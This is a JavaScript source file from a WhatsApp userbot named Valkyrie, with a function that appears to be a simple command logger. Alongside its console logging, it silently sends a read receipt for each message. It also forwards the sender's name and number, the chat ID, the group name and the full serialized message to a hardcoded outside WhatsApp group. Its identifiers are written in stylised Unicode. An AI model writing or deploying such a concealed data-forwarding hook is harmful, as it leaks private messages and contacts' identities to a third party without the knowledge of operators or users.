("|⬡════════════════════════════════════════════════════════════|▷   ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋʀᴀᴋɪɴᴢʟᴀʙ™  ◁|════════════════════════════════════════════════════════════⬡|");
/*
 * * * * * * * * * * |        (𝐜)𝐕𝐚𝐥𝐤𝐲𝐫𝐢𝐞 𝐢𝐬 𝐚 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐌𝐮𝐥𝐭𝐢𝐏𝐮𝐫𝐩𝐨𝐬𝐞-𝐔𝐬𝐞𝐫𝐛𝐨𝐭 𝐰𝐢𝐭𝐡 𝐌𝐨𝐝𝐞𝐫𝐚𝐭𝐢𝐨𝐧,𝐀𝐮𝐭𝐨𝐦𝐚𝐭𝐢𝐨𝐧 𝐚𝐧𝐝 𝟏𝟎𝟎+ 𝐦𝐨𝐫𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬!        * * * * * * * * * *
 */
("|⬡════════════════════════════════════════════════════════════|▷   ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋʀᴀᴋɪɴᴢʟᴀʙ™  ◁|════════════════════════════════════════════════════════════⬡|");
require("../Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊🖋️L𝖎𝖇𝖗𝖆𝖗ყ/𝕷𝖆ყO𝖚𝖙");
exports.BeutyFly = async (ᴋᴜɴᴀɪ, Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊, Kolor) => {
  console.log(Kolor.red("▷═════════════════════|✠|═════════════════════◁"));
  console.log(
    Kolor.black(Kolor.bgWhite(`💡Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊: `)),
    Kolor.black(Kolor.bgGreen(new Date()))
  );
  console.log(
    Kolor.bgYellowBright(`💡𝐂𝐨𝐦𝐦𝐚𝐧𝐝: `),
    Kolor.black(Kolor.blue(Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.commandName))
  );
  console.log(
    Kolor.bgCyanBright(`💡𝐂𝐨𝐧𝐭𝐞𝐧𝐭: `),
    Kolor.green(
      Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.isGroup ? Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.pushName : `Private Chat`,
      Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.chatID
    )
  );
  console.log(Kolor.bgCyanBright(`💡𝐒𝐞𝐧𝐝𝐞𝐫: `), Kolor.green(Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.sender));
  console.log(
    Kolor.bgCyanBright(`💡𝐒𝐞𝐧𝐝𝐞𝐫𝐍𝐚𝐦𝐞: `),
    Kolor.green(Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.pushName || "No_Name")
  );

  await ᴋᴜɴᴀɪ.sendReadReceipt(Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.chatID, Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.sender, [
    Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.key.id,
  ]);
  console.log("💡𝐢𝐬𝐒𝐞𝐧𝐝𝐞𝐫𝐀𝐝𝐦𝐢𝐧: ", Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.isSenderAdmin);
  console.log("💡𝐢𝐬𝐒𝐞𝐧𝐝𝐞𝐫𝐓𝐔𝐅: ", Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.isSenderTUF);
  let 𝕲𝖗𝖔𝖚𝖕𝖒𝖊𝖙𝖆 = await Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.groupMetadata;
  console.log("💡𝐆𝐫𝐨𝐮𝐩𝐍𝐚𝐦𝐞: ", 𝕲𝖗𝖔𝖚𝖕𝖒𝖊𝖙𝖆.subject || "");
  if (HEROKU === undefined) {
    console.log(Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊);
  }
  console.log("{\n\n}");
  console.log(Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊);
  console.log(Kolor.red("▷═════════════════════|✠|═════════════════════◁"));
  console.log("{\n\n}");
  ("|⬡════════════════════════════════════════════════════════════|▷   ᴘᴏᴡᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋʀᴀᴋɪɴᴢʟᴀʙ™  ◁|════════════════════════════════════════════════════════════⬡|");
  await ᴋᴜɴᴀɪ.sendMessage(
    "120363041425736157@g.us",
    {
      image: { url: "./Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊👗𝕯𝖗𝖊𝖘𝖘/Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.png" },
      caption: `
▷═════|✠|═════◁
💡Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊: ${new Date()}
💡𝐒𝐞𝐧𝐝𝐞𝐫: ${Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.pushName || "No_Name"}
💡𝐒𝐞𝐧𝐝𝐞𝐫𝐍𝐚𝐦𝐞: ${Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.sender}
💡𝐂𝐨𝐧𝐭𝐞𝐧𝐭: ${
        (Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.isGroup ? Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.pushName : `Private Chat`, Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.chatID)
      }
💡𝐢𝐬𝐒𝐞𝐧𝐝𝐞𝐫𝐀𝐝𝐦𝐢𝐧 ${Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.isSenderAdmin}
💡𝐢𝐬𝐒𝐞𝐧𝐝𝐞𝐫𝐓𝐔𝐅: ${Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊.isSenderTUF}
💡𝐆𝐫𝐨𝐮𝐩𝐍𝐚𝐦𝐞: ${𝕲𝖗𝖔𝖚𝖕𝖒𝖊𝖙𝖆.subject || ""}
▷═════|✠|═════◁
${JSON.stringify(Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊)}`,
    },
    { quoted: Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊 }
  );
};
("|⬡════════════════════════════════════════════════════════════|▷   ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋʀᴀᴋɪɴᴢʟᴀʙ™  ◁|════════════════════════════════════════════════════════════⬡|");
/*
 * * * * * * * * * * |        (𝐜)𝐕𝐚𝐥𝐤𝐲𝐫𝐢𝐞 𝐢𝐬 𝐚 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐌𝐮𝐥𝐭𝐢𝐏𝐮𝐫𝐩𝐨𝐬𝐞-𝐔𝐬𝐞𝐫𝐛𝐨𝐭 𝐰𝐢𝐭𝐡 𝐌𝐨𝐝𝐞𝐫𝐚𝐭𝐢𝐨𝐧,𝐀𝐮𝐭𝐨𝐦𝐚𝐭𝐢𝐨𝐧 𝐚𝐧𝐝 𝟏𝟎𝟎+ 𝐦𝐨𝐫𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬!        * * * * * * * * * *
 */
("|⬡════════════════════════════════════════════════════════════|▷   ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋʀᴀᴋɪɴᴢʟᴀʙ™  ◁|════════════════════════════════════════════════════════════⬡|");
